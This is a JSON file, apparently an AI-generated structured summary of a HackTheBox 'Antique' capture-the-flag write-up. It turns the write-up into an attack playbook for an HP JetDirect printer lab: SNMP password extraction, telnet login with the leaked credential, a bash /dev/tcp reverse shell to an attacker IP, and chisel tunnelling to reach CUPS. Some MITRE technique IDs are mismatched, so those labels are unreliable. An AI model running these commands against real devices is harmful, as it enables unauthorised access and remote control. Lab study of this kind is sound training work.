@@ -1,0 +1,854 @@
+{
+  "writeup_id": "Htb_Antique",
+  "scenario_fingerprint": {
+    "scenario_name": "hp_jetdirect_printer_snmp_telnet",
+    "primary_services": [
+      "snmp",
+      "telnet"
+    ],
+    "port_signature": "23+161",
+    "service_combination": "telnet+snmp",
+    "os_family": "linux",
+    "environment_type": "printer_simulation",
+    "entry_vector": "snmp_password_leak",
+    "privilege_path": "telnet_exec_to_cups_lpe",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "hp_jetdirect_banner",
+      "snmp_oid_password_leak",
+      "printer_telnet_interface"
+    ],
+    "environmental_clues": [
+      "jetdirect_service_banner",
+      "snmp_v1_public_community",
+      "printer_management_interface"
+    ],
+    "similar_scenarios": [
+      "printer_exploitation",
+      "embedded_device_attacks"
+    ],
+    "unique_aspects": [
+      "hp_printer_oid_1.3.6.1.4.1.11.2.3.9.1.1.13.0",
+      "hex_encoded_password_in_snmp",
+      "cups_print_manager_lpe"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SNMP_Password_Extraction",
+        "success_reason": "HP JetDirect printer exposed password via SNMP OID .1.3.6.1.4.1.11.2.3.9.1.1.13.0",
+        "prerequisite_indicators": [
+          "snmp_service_available",
+          "default_community_string_public",
+          "hp_jetdirect_device_detected"
+        ],
+        "recognition_patterns": [
+          "HP JetDirect banner on telnet",
+          "SNMP responds to public community",
+          "Printer-specific SNMP OIDs accessible",
+          "Hex-encoded password in SNMP response"
+        ],
+        "failure_modes": [
+          "snmp_community_string_changed",
+          "snmp_service_disabled",
+          "password_oid_not_accessible",
+          "non_hp_printer_device"
+        ],
+        "environmental_factors": [
+          "default_printer_configuration",
+          "legacy_network_printer_setup",
+          "insufficient_snmp_hardening"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Telnet_Authentication_Bypass",
+        "success_reason": "Extracted password P@ssw0rd@123!!123 provided access to HP JetDirect management interface",
+        "prerequisite_indicators": [
+          "telnet_service_available",
+          "hp_jetdirect_interface_detected",
+          "valid_credentials_obtained"
+        ],
+        "recognition_patterns": [
+          "Password prompt on telnet connection",
+          "HP JetDirect management interface",
+          "Help menu shows exec command available"
+        ],
+        "failure_modes": [
+          "password_changed_from_default",
+          "telnet_service_disabled",
+          "account_lockout_mechanisms"
+        ],
+        "environmental_factors": [
+          "default_printer_credentials",
+          "legacy_management_interface",
+          "no_authentication_hardening"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "Command_Execution_via_Printer_Interface",
+        "success_reason": "HP JetDirect exec command allowed arbitrary system command execution",
+        "prerequisite_indicators": [
+          "authenticated_printer_access",
+          "exec_command_available",
+          "underlying_linux_system"
+        ],
+        "recognition_patterns": [
+          "exec command in help menu",
+          "System commands execute successfully",
+          "Unix/Linux command responses"
+        ],
+        "failure_modes": [
+          "exec_command_disabled",
+          "command_execution_restricted",
+          "sandboxed_environment"
+        ],
+        "environmental_factors": [
+          "printer_firmware_vulnerabilities",
+          "unrestricted_command_execution",
+          "network_printer_misconfiguration"
+        ],
+        "success_probability": 0.88,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "SNMP service on UDP 161",
+        "discovery_method": "UDP port scan with top ports",
+        "why_critical": "Exposed printer password via HP-specific SNMP OID",
+        "how_to_recognize": [
+          "UDP 161 responds to SNMP queries",
+          "Public community string accepted",
+          "HP JetDirect device identified"
+        ],
+        "follow_up_actions": [
+          "query_hp_specific_oids",
+          "extract_hex_encoded_password",
+          "test_telnet_authentication"
+        ]
+      },
+      {
+        "discovery": "HP JetDirect password in SNMP OID",
+        "discovery_method": "SNMP walk on .1.3.6.1.4.1.11.2.3.9.1.1.13.0",
+        "why_critical": "Provided authentication credentials for printer management interface",
+        "how_to_recognize": [
+          "Hex-encoded data in SNMP response",
+          "ASCII characters when decoded",
+          "Password-like string pattern"
+        ],
+        "follow_up_actions": [
+          "decode_hex_to_ascii",
+          "test_password_on_telnet",
+          "explore_printer_management_interface"
+        ]
+      },
+      {
+        "discovery": "exec command in HP JetDirect interface",
+        "discovery_method": "Help command in authenticated telnet session",
+        "why_critical": "Enabled arbitrary command execution on underlying Linux system",
+        "how_to_recognize": [
+          "exec command listed in help menu",
+          "System commands execute successfully",
+          "Shell access possible"
+        ],
+        "follow_up_actions": [
+          "test_command_execution",
+          "establish_reverse_shell",
+          "enumerate_system_for_privilege_escalation"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated",
+        "escalation_method": "SNMP_to_Telnet_Authentication",
+        "why_possible": "Default SNMP configuration exposed printer credentials",
+        "recognition_signs": [
+          "snmp_service_accessible",
+          "public_community_string",
+          "hp_jetdirect_device_type"
+        ],
+        "exploitation_path": "SNMP Query → Password Extraction → Telnet Authentication"
+      },
+      {
+        "privilege_level": "authenticated_printer_user",
+        "escalation_method": "Management_Interface_to_Shell",
+        "why_possible": "Printer management interface allowed system command execution",
+        "recognition_signs": [
+          "exec_command_available",
+          "underlying_linux_system",
+          "unrestricted_command_execution"
+        ],
+        "exploitation_path": "Telnet Access → exec Command → Reverse Shell → lp User"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Only TCP port 23 (telnet) open, requires password",
+        "decision": "Scan UDP ports for additional attack vectors",
+        "reasoning": "Limited TCP attack surface suggests need for alternative reconnaissance",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "password_bruteforce",
+            "when": "if no other services found"
+          },
+          {
+            "option": "service_enumeration",
+            "when": "if additional ports discovered"
+          }
+        ],
+        "success_indicators": [
+          "additional_services_discovered",
+          "snmp_service_responding"
+        ],
+        "next_decision": "enumerate_discovered_services"
+      },
+      {
+        "step": 2,
+        "situation": "SNMP service discovered on UDP 161",
+        "decision": "Enumerate SNMP for sensitive information disclosure",
+        "reasoning": "SNMP commonly misconfigured and leaks credentials on network devices",
+        "confidence": 0.85,
+        "prerequisites": [
+          "snmp_service_accessible",
+          "public_community_string"
+        ],
+        "success_indicators": [
+          "sensitive_data_leaked",
+          "credentials_discovered"
+        ],
+        "failure_fallbacks": [
+          "snmp_bruteforce",
+          "telnet_password_spray"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "HP JetDirect printer detected via telnet banner",
+        "decision": "Use printer-specific SNMP OIDs for credential extraction",
+        "reasoning": "HP printers known to leak passwords via specific SNMP OID queries",
+        "confidence": 0.95,
+        "prerequisites": [
+          "hp_jetdirect_identified",
+          "snmp_access_available"
+        ],
+        "success_indicators": [
+          "hex_encoded_password_retrieved"
+        ],
+        "next_decision": "decode_and_authenticate"
+      },
+      {
+        "step": 4,
+        "situation": "Hex-encoded password retrieved from SNMP",
+        "decision": "Decode hex values to ASCII and extract readable password",
+        "reasoning": "SNMP returns password as hex-encoded bytes requiring conversion",
+        "confidence": 0.9,
+        "prerequisites": [
+          "hex_data_retrieved"
+        ],
+        "success_indicators": [
+          "readable_password_extracted"
+        ],
+        "next_decision": "authenticate_with_credentials"
+      },
+      {
+        "step": 5,
+        "situation": "Valid credentials obtained for telnet service",
+        "decision": "Explore printer management interface for command execution",
+        "reasoning": "Printer management interfaces often include diagnostic/exec functions",
+        "confidence": 0.8,
+        "prerequisites": [
+          "authenticated_access_established"
+        ],
+        "success_indicators": [
+          "exec_command_available",
+          "system_command_execution"
+        ],
+        "next_decision": "establish_reverse_shell"
+      }
+    ],
+    "branching_logic": {
+      "if_snmp_succeeds": {
+        "action": "query_printer_specific_oids",
+        "tools": [
+          "snmpwalk",
+          "python_hex_decoder"
+        ],
+        "next_phase": "credential_extraction_and_decode"
+      },
+      "if_snmp_fails": {
+        "action": "try_alternative_enumeration",
+        "alternatives": [
+          "telnet_bruteforce",
+          "service_version_exploits"
+        ],
+        "decision_criteria": "based_on_service_fingerprints"
+      },
+      "if_credentials_obtained": {
+        "action": "authenticate_and_explore_interface",
+        "purpose": "find_command_execution_capabilities",
+        "tools": [
+          "telnet",
+          "nc"
+        ]
+      },
+      "if_exec_available": {
+        "action": "establish_persistent_access",
+        "purpose": "gain_interactive_shell",
+        "tools": [
+          "bash_reverse_shell",
+          "nc_listener"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_scan_udp_when_tcp_limited",
+        "reasoning": "network_devices_commonly_expose_management_via_udp",
+        "applicability": "minimal_tcp_attack_surface"
+      },
+      {
+        "rule": "use_device_specific_snmp_oids_for_printers",
+        "reasoning": "printer_manufacturers_use_predictable_oid_structures",
+        "applicability": "hp_jetdirect_or_similar_printer_services"
+      },
+      {
+        "rule": "check_for_exec_commands_in_printer_interfaces",
+        "reasoning": "diagnostic_functions_often_allow_system_command_execution",
+        "applicability": "authenticated_printer_management_access"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SNMP_Password_Extraction",
+        "mitre_id": "T1040",
+        "required_services": [
+          "snmp"
+        ],
+        "required_ports": [
+          161
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "snmp_service_enabled",
+          "default_community_string",
+          "network_printer_simulation"
+        ],
+        "success_indicators": [
+          "snmpwalk_returns_data",
+          "hp_jetdirect_banner",
+          "password_oid_accessible"
+        ],
+        "incompatible_with": [
+          "snmp_disabled",
+          "custom_community_strings",
+          "snmp_access_control"
+        ],
+        "confidence_boosters": [
+          "printer_service_detected",
+          "jetdirect_banner_present",
+          "specific_oid_responds"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Telnet_Authentication_Bypass",
+        "mitre_id": "T1021.004",
+        "required_services": [
+          "telnet"
+        ],
+        "required_ports": [
+          23
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "telnet_service_enabled",
+          "weak_authentication",
+          "leaked_credentials_available"
+        ],
+        "success_indicators": [
+          "authentication_successful",
+          "command_prompt_accessible",
+          "help_menu_available"
+        ],
+        "incompatible_with": [
+          "telnet_disabled",
+          "strong_authentication",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "default_credentials",
+          "service_banner_present",
+          "interactive_shell_available"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "1-3 minutes"
+      },
+      {
+        "technique": "CUPS_File_Read_Exploitation",
+        "mitre_id": "T1068",
+        "required_services": [
+          "cups"
+        ],
+        "required_ports": [
+          631
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "cups_service_running",
+          "vulnerable_cups_version",
+          "local_access_available"
+        ],
+        "success_indicators": [
+          "cups_version_vulnerable",
+          "file_read_successful",
+          "root_file_access"
+        ],
+        "incompatible_with": [
+          "cups_patched",
+          "access_controls_enabled",
+          "cups_disabled"
+        ],
+        "confidence_boosters": [
+          "old_cups_version",
+          "default_configuration",
+          "print_services_present"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "10-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "network_printer": {
+        "port_indicators": [
+          23,
+          161,
+          515,
+          631,
+          9100
+        ],
+        "service_indicators": [
+          "telnet",
+          "snmp",
+          "lpd",
+          "ipp",
+          "jetdirect"
+        ],
+        "banner_indicators": [
+          "HP JetDirect",
+          "Printer",
+          "CUPS"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "snmp_service": {
+        "port_indicators": [
+          161,
+          162
+        ],
+        "service_indicators": [
+          "snmp"
+        ],
+        "technology_indicators": [
+          "SNMPv1",
+          "SNMPv2c",
+          "public_community"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "cups_service": {
+        "port_indicators": [
+          631
+        ],
+        "service_indicators": [
+          "ipp",
+          "cups"
+        ],
+        "technology_indicators": [
+          "CUPS",
+          "print_manager"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "snmp_password_extraction",
+          "when": "snmp_service_detected",
+          "reason": "often_reveals_credentials_for_other_services"
+        },
+        {
+          "attack": "telnet_authentication",
+          "when": "telnet_service_detected_with_credentials",
+          "reason": "direct_command_execution_possible"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "cups_exploitation",
+          "when": "cups_service_detected",
+          "reason": "privilege_escalation_potential"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "SNMP Password Extraction",
+        "mitre_id": "T1552.001",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "snmpwalk",
+            "command_template": "snmpwalk -v 2c -c public {target_ip} .1.3.6.1.4.1.11.2.3.9.1.1.13.0",
+            "actual_command": "snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0",
+            "output_pattern": "BITS: [hex values representing password]",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "snmp_service_accessible",
+          "public_community_string",
+          "hp_jetdirect_printer"
+        ],
+        "success_indicators": [
+          "hex_values_returned",
+          "password_decodes_to_readable_text",
+          "password_works_for_authentication"
+        ],
+        "common_failures": [
+          "snmp_service_not_running",
+          "community_string_changed",
+          "oid_not_supported"
+        ],
+        "follow_up_techniques": [
+          "telnet_authentication",
+          "printer_command_execution"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "HP JetDirect Command Execution",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "execution",
+        "tools_used": [
+          {
+            "name": "telnet",
+            "command_template": "telnet {target_ip}",
+            "actual_command": "telnet 10.10.11.107",
+            "output_pattern": "HP JetDirect\\n\\nPassword:",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "valid_printer_password",
+          "telnet_service_accessible",
+          "hp_jetdirect_interface"
+        ],
+        "success_indicators": [
+          "authentication_successful",
+          "exec_command_available",
+          "system_commands_execute"
+        ],
+        "common_failures": [
+          "invalid_password",
+          "exec_command_disabled",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "system_enumeration"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "CUPS File Read Vulnerability",
+        "mitre_id": "T1005",
+        "category": "collection",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl http://127.0.0.1:631/",
+            "actual_command": "curl 127.0.0.1:631",
+            "output_pattern": "CUPS 1.6.1 web interface",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "cups_service_running",
+          "vulnerable_cups_version",
+          "local_access_to_service"
+        ],
+        "success_indicators": [
+          "cups_interface_accessible",
+          "version_1.6.x_identified",
+          "file_read_capability_confirmed"
+        ],
+        "common_failures": [
+          "cups_not_running",
+          "patched_version",
+          "access_restrictions"
+        ],
+        "follow_up_techniques": [
+          "root_flag_extraction",
+          "sensitive_file_enumeration"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "snmpwalk",
+        "use_case": "printer_password_extraction",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "network_printer_attacks"
+        ],
+        "alternatives": [
+          "snmpget",
+          "onesixtyone"
+        ],
+        "best_practices": [
+          "try_common_community_strings",
+          "use_printer_specific_oids",
+          "decode_hex_output_properly"
+        ]
+      },
+      {
+        "tool": "telnet",
+        "use_case": "printer_interface_access",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "legacy_device_access"
+        ],
+        "alternatives": [
+          "nc",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "identify_service_banners",
+          "look_for_exec_commands",
+          "test_command_injection"
+        ]
+      },
+      {
+        "tool": "chisel",
+        "use_case": "port_forwarding_tunneling",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "medium",
+        "essential_for": [
+          "internal_service_access"
+        ],
+        "alternatives": [
+          "ssh_tunnels",
+          "socat"
+        ],
+        "best_practices": [
+          "use_reverse_connections",
+          "forward_specific_ports_only",
+          "clean_up_after_use"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "snmp_to_printer_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nmap -sU --top-ports 10 -sV 10.10.11.107",
+            "purpose": "Discover SNMP service",
+            "expected_output": "161/udp open snmp"
+          },
+          {
+            "step": 2,
+            "command": "snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0",
+            "purpose": "Extract password from SNMP",
+            "expected_output": "BITS: 50 40 73 73 77 30 72 64..."
+          },
+          {
+            "step": 3,
+            "command": "python3 -c \"nums='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33'; print(''.join([chr(int(x, 16)) for x in nums.split()]))\"",
+            "purpose": "Decode hex to ASCII password",
+            "expected_output": "P@ssw0rd@123!!123"
+          },
+          {
+            "step": 4,
+            "command": "telnet 10.10.11.107",
+            "purpose": "Connect to printer interface",
+            "expected_output": "HP JetDirect Password:"
+          },
+          {
+            "step": 5,
+            "command": "exec bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'",
+            "purpose": "Execute reverse shell",
+            "expected_output": "Shell as lp user"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "10-15 minutes"
+      },
+      {
+        "sequence_name": "cups_privilege_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "netstat -tnlp",
+            "purpose": "Identify internal services",
+            "expected_output": "127.0.0.1:631 LISTEN"
+          },
+          {
+            "step": 2,
+            "command": "curl 127.0.0.1:631",
+            "purpose": "Identify CUPS version",
+            "expected_output": "CUPS 1.6.1"
+          },
+          {
+            "step": 3,
+            "command": "chisel server -p 8000 --reverse",
+            "purpose": "Setup tunnel server on attacker",
+            "expected_output": "Chisel server listening"
+          },
+          {
+            "step": 4,
+            "command": "./chisel client 10.10.14.6:8000 R:631:127.0.0.1:631",
+            "purpose": "Forward CUPS port to attacker",
+            "expected_output": "Tunnel established"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "15-25 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Antique",
+      "difficulty": "Easy",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2021-09-27",
+      "author": "MrR3boot",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "snmp",
+        "telnet",
+        "cups"
+      ],
+      "key_vulnerabilities": [
+        "snmp_information_disclosure",
+        "cups_file_read",
+        "command_injection"
+      ],
+      "environment_type": "printer_simulation",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "snmp_enumeration",
+        "printer_exploitation",
+        "cups_vulnerabilities"
+      ],
+      "prerequisite_knowledge": [
+        "basic_networking",
+        "snmp_basics",
+        "linux_fundamentals"
+      ]
+    },
+    "categorization": {
+      "primary_category": "network_services",
+      "subcategories": [
+        "printer_exploitation",
+        "snmp_attacks",
+        "cups_vulnerabilities"
+      ],
+      "attack_types": [
+        "information_disclosure",
+        "command_execution",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_snmp_configuration",
+        "printer_security",
+        "service_hardening"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Mirai",
+        "Shocker",
+        "Beep"
+      ],
+      "similarity_reasons": [
+        "iot_simulation",
+        "service_exploitation",
+        "legacy_vulnerabilities"
+      ],
+      "unique_aspects": [
+        "printer_focus",
+        "jetdirect_exploitation",
+        "cups_file_read"
+      ],
+      "difficulty_factors": [
+        "straightforward_enumeration",
+        "well_known_techniques",
+        "clear_attack_path"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T02:10:36.611574",
+    "original_file": "0xdf_writeups/Htb Antique.md",
+    "content_length": 25298,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
